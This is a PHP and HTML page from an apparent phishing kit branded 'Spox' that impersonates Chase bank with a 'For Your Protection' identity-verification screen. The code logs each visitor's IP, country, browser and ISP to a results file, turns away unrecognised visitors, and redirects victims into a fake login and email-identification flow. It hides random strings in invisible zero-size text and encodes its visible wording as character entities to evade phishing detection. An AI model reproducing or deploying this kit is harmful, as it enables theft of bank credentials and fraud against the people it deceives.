<?php
session_start();
error_reporting(0);
include 'spox_bot.php';
include 'check.php';
if (empty($_GET['ch_id']) or empty($_GET['country']) or empty($_GET['expired']) or !isset($_SESSION['SPOX_SESSION'])) {
       text_spox("admin/result/blocked.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | Undefined Visitor\r\n");include'blocked.php';exit();
}
if (!isset($_SESSION['LOGIN_SESSION'])) {
    exit(header("Location: login?ch_id=$rundomizi&country=".$country_spox."&expired=$expired"));
}
$start = "email_identification?ch_id=$rundomizi&country=".$country_spox."&expired=$expired";
?>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr">
<head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>&#70;&#111;&#114;&#32;&#89;&#111;&#117;&#114;&#32;&#80;&#114;&#111;&#116;&#101;&#99;&#116;&#105;&#111;&#110;</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="Spox/Files/img/chasefavicon.ico">
        <link rel="stylesheet" href="Spox/Files/css/logon.css">
        <link rel="stylesheet" href="Spox/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="Spox/Files/css/overview.css">

</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div data-is-view="true">
<div class="homepage">

<div class="logon-container">
<header class="toggle-aria-hidden">
<div class="logon header jpui transparent navigation bar">
<a href="#">
<div class="chase logo"></div>
<span class="util accessible-text">SPOX LOVE YOU !</span>
</a>
</div>
</header>

<form action="<?php echo $start;?>" method="POST">
<main >
<div class="msd">
<div class="jpui background image fixed blurred"></div>
<div class="container">
<div class="row jpui primary panel">
<div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
<div class="toggle-aria-hidden">
<h1 class="header">F<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>o<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>r Y<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>o<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>u<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>r P<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>r<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#111;&#116;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#101;&#99;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#116;&#105;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#111;&#110;</h1>
<div class="row jpui panel body">
    <div class="col-xs-12 col-sm-10 col-sm-offset-1">
    <div class="progress u-no-outline">
    <div class="row">
    <div class="col-xs-12 col-sm-6 clear-padding"><h2>&#73;&#110;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#115;&#116;&#114;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#117;&#99;&#116;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#105;&#111;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#110;&#115;</h2></div>
    <div class="col-xs-12 col-sm-6 progress-padding">
    <div class="jpui progress rectangles">
    <ol class="steps-3">
        <li class="active current-step"></li>
        <li id="progress-progressBar-step-2"></li>
        <li id="progress-progressBar-step-3"></li>
    </ol>
</div>
</div>
</div>
</div>
<h3>&#87;&#101;&#32;&#100;&#111;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#110;&#39;&#116;&#32;&#114;&#101;&#99;&#111;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#103;&#110;&#105;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>ze th<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#101;&#32;&#99;&#111;&#109;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>pu<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#116;&#101;&#114;&#32;&#121;&#111;<font style="color:transparent;font-size:0px"><?= $rundomizi ?></font>&#117;&#39;&#114;&#101;&#32;&#117;&#115;&#105;&#110;&#103;&#46;</h3>
<div class="inside-container">
<p>&#84;&#104;&#105;&#115;&#32;&#109;&#97;&#121;&#32;&#104;&#97;&#118;&#101;&#32;&#104;&#97;&#112;&#112;&#101;&#110;&#101;&#100;&#32;&#98;&#101;&#99;&#97;&#117;&#115;&#101;&#32;&#121;&#111;&#117;&#39;&#114;&#101;&#32;&#117;&#115;&#105;&#110;&#103;&#32;&#97;&#32;&#100;&#101;&#118;&#105;&#99;&#101;&#32;&#121;&#111;&#117;&#32;&#100;&#111;&#110;&#39;&#116;&#32;&#117;&#115;&#117;&#97;&#108;&#108;&#121;&#32;&#117;&#115;&#101;&#32;&#111;&#114;&#32;&#121;&#111;&#117;&#32;&#99;&#108;&#101;&#97;&#114;&#101;&#100;&#32;&#116;&#104;&#101;&#32;&#99;&#111;&#111;&#107;&#105;&#101;&#115;&#32;&#111;&#110;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#104;&#111;&#110;&#101;&#46;&#32;&#40;&#67;&#111;&#111;&#107;&#105;&#101;&#115;&#32;&#97;&#114;&#101;&#32;&#104;&#111;&#119;&#32;&#119;&#101;&#32;&#114;&#101;&#109;&#101;&#109;&#98;&#101;&#114;&#32;&#121;&#111;&#117;&#46;&#41;<br>
<br>&#70;&#111;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#115;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#44;&#32;&#119;&#101;&#32;&#110;&#101;&#101;&#100;&#32;&#116;&#111;&#32;&#118;&#101;&#114;&#105;&#102;&#121;&#32;&#121;&#111;&#117;&#114;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#98;&#101;&#102;&#111;&#114;&#101;&#32;&#121;&#111;&#117;&#32;&#99;&#97;&#110;&#32;&#115;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#115;&#46;<br>
<br>&#67;&#104;&#111;&#111;&#115;&#101;&#32;&#34;&#78;&#101;&#120;&#116;&#34;&#32;&#116;&#111;&#32;&#108;&#101;&#116;&#32;&#117;&#115;&#32;&#107;&#110;&#111;&#119;&#32;&#104;&#111;&#119;&#32;&#121;&#111;&#117;&#32;&#119;&#97;&#110;&#116;&#32;&#116;&#111;&#32;&#114;&#101;&#99;&#101;&#105;&#118;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#116;&#101;&#109;&#112;&#111;&#114;&#97;&#114;&#121;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#32;&#99;&#111;&#100;&#101;&#46;</p> <p>
    <span class="jpui link">
    <a class="link-anchor underline" href="javascript:void(0);" >&#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;&#115;&#63;
</a>
</span>
</p>
</div>

<div class="button-container row show-sm">
<div class="col-xs-12 col-sm-3 col-sm-offset-6">
<button type="button" class="jpui button focus fluid cancel">
<span class="label">&#67;&#97;&#110;&#99;&#101;&#108;</span>
</button>
</div>
<div class="col-xs-12 col-sm-3">
<button type="submit" class="jpui button focus fluid primary">
<span class="label">&#78;&#101;&#120;&#116;</span>
</button>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</form>
</div>
</div>
</div>


</body>
</html>